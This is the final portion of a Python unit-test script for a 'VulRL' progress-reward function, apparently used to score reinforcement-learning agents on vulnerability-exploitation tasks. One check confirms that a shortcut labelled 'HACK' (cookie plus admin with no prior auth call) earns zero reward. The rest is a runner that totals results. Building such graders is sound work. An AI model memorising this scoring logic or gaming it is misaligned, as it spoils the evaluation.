    if check("HACK: cookie+admin but no auth-call first → 0", s, 0.0): n_pass += 1

    print(f"  M09 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


def main():
    print("=" * 70)
    print("VulRL Progress Reward Unit Tests (v2.3 taxonomy)")
    print("=" * 70)

    p_m01, t_m01 = test_m01()
    p1, t1 = test_m03()
    p_m04, t_m04 = test_m04()
    p2, t2 = test_m05()
    p_m06, t_m06 = test_m06()
    p_m07, t_m07 = test_m07()
    p_m08, t_m08 = test_m08()
    p_m09, t_m09 = test_m09()
    p3, t3 = test_m10()
    p4, t4 = test_m11()
    p_m12, t_m12 = test_m12()

    total_pass = p_m01 + p1 + p_m04 + p2 + p_m06 + p_m07 + p_m08 + p_m09 + p3 + p4 + p_m12
    total_n = t_m01 + t1 + t_m04 + t2 + t_m06 + t_m07 + t_m08 + t_m09 + t3 + t4 + t_m12

    print("\n" + "=" * 70)
    print(f"TOTAL: {total_pass}/{total_n} tests passed")
    print("=" * 70)

    return 0 if total_pass == total_n else 1


if __name__ == "__main__":
    sys.exit(main())
